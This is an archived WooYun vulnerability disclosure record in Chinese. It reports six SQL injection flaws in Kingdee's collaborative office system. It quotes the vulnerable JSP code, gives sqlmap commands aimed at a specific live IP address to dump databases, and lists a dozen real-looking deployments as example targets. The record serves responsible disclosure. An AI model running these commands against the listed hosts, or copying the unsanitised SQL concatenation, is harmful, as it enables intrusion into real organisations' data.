{"id": 66963, "wybug_id": "wooyun-2015-0133470", "wybug_title": "金蝶协作办公系统存在六个SQL注射漏洞", "wybug_corp": "金蝶", "wybug_author": "路人甲", "wybug_date": "2015-08-12 17:10", "wybug_open_date": "2015-11-10 17:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-10：\t细节向公众公开  简要描述： 金蝶协作办公系统存在六个SQL注射漏洞，影响很多大型企业 详细说明：  存在漏洞的文件为\n/kingdee/flow_performance/add_search_case.jsp?name=1 name存在漏洞/kingdee/flow_performance/add_view_case.jsp?name=1 name存在漏洞/kingdee/flow_performance/del_search_case.jsp?id=1 id存在漏洞/kingdee/flow_performance/del_view_case.jsp?id=1 id存在漏洞/kingdee/flow_performance/flow_performance_data.jsp?search_case=1 search_case存在漏洞/kingdee/flow_performance/flow_performance_display.jsp?user_id=1 user_id存在漏洞\n选取部分漏洞，做漏洞证明0x1 /kingdee/flow_performance/add_search_case.jsp 漏洞部分代码如下\n<%\tString name = PubFunc.toString(request.getParameter(\"name\"));\tname = sysUtil.pubUtil.CharBase64.Decode(name);\tString search_value = PubFunc.toString(request.getParameter(\"search_value\"));\tsearch_value = sysUtil.pubUtil.CharBase64.Decode(search_value);\tTableCtrl db = new TableCtrl();\tif(db.getRowCount(\"select * from x_flow_performance_search_case where name='\"+name+\"'\")>0){\t\tout.println(\"ERR1\");\t\treturn;\t}\n\nsqlmap.py -u \"http://221.226.149.17:8080/kingdee/flow_performance/add_search_case.jsp?name=1\" --tamper \"base64encode.py\"\n\n\n0x2 /kingdee/flow_performance/add_view_case.jsp 部分漏洞代码为\n<%\tString id = PubFunc.toString(request.getParameter(\"id\"));\tString name = PubFunc.toString(request.getParameter(\"name\"));\tname = sysUtil.pubUtil.CharBase64.Decode(name);\tTableCtrl db = new TableCtrl();\tif(id.length()>0){\t\tif(db.getRowCount(\"select * from x_flow_performance_view_case where name='\"+name+\"' and id <>\" + id)>0){\t\t\tout.println(\"ERR2\");\t\t\treturn;\t\t}\t}\n\nsqlmap.py -u \"http://221.226.149.17:8080/kingdee/flow_performance/add_view_case.jsp?name=1\" --tamper \"base64encode.py\"\n\n\n0x3 /kingdee/flow_performance/del_search_case.jsp?id=1 部分漏洞代码为\n<%@ page contentType=\"text/html; charset=gbk\" import=\"pub.*\"%><%\tString id = PubFunc.toString(request.getParameter(\"id\"));\tTableCtrl db = new TableCtrl();\tif(db.getRowCount(\"select * from x_flow_performance_view_case where search_case=\"+id)>0){\t\tout.println(\"ERR1\");\t\treturn;\t}\tint result = db.exec(\"delete from x_flow_performance_search_case where id=\"+id);\tif(result < 1)\t\tout.println(\"ERR\");\telse\t\tout.println(\"OK|\"+id);%>\nsqlmap.py -u \"http://221.226.149.17:8080/kingdee/flow_performance/del_search_case.jsp?id=1\"\n\n0x4 /kingdee/flow_performance/flow_performance_data.jsp 部分漏洞代码为\nString issearch = PubFunc.toString(request.getParameter(\"issearch\"));String search_case = PubFunc.toString(request.getParameter(\"search_case\"));TableCtrl db = new TableCtrl();if(!search_case.equals(\"\")){\tString search_value = PubFunc.toString(db.getFieldValue(\"x_flow_performance_search_case\",\"top 1 search_value\",\"id=\"+search_case));\n\nsqlmap.py -u \"http://221.226.149.17:8080/kingdee/flow_performance/flow_performance_data.jsp?search_case=1\" --dbms mssql\n\n\n其他漏洞类似，这里不再一一证明，给出几个案例：\nhttp://221.226.149.17:8080/kingdee/login/loginpage.jsphttp://122.139.60.103:800/kingdee/login/loginpage.jsphttp://oa.guanhao.com:8080/kingdee/login/loginpage.jsphttp://222.179.238.182:8082/kingdee/login/loginpage2.jsphttp://222.134.77.23:8080/kingdee/login/loginpage.jsphttp://221.4.245.218:8080/kingdee/login/loginpage.jsphttp://221.226.149.17:8080/kingdee/login/loginpage.jsphttp://220.189.244.202:8080/kingdee/login/loginpage.jsphttp://222.133.44.10:8080/kingdee/login/loginpage.jsphttp://223.95.183.6:8080/kingdee/login/loginpage.jsphttp://61.190.20.51/kingdee/login/loginpage.jsphttp://60.194.110.187/kingdee/login/loginpage.jsphttp://oa.roen.cn/kingdee/login/loginpage.jsp\n   漏洞证明：  这些漏洞均可以直接用SQLMAP跑出数据，数据截图\nsqlmap.py -u \"http://221.226.149.17:8080/kingdee/flow_performance/flow_performance_display.jsp?user_id=1\" --dbs\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-12 17:46 厂商回复： 谢谢对金蝶的关注，此产品为合作伙伴产品，我们已通知相关部门为客户修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-11-10 17:49 |    \t\t风格 \t\t\t( 路人 |\t\t\t        Rank:33 漏洞数:11        | 注册为白帽子，你可以在这里提交你发现的漏...)\t\t \n  这个不算通用么    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}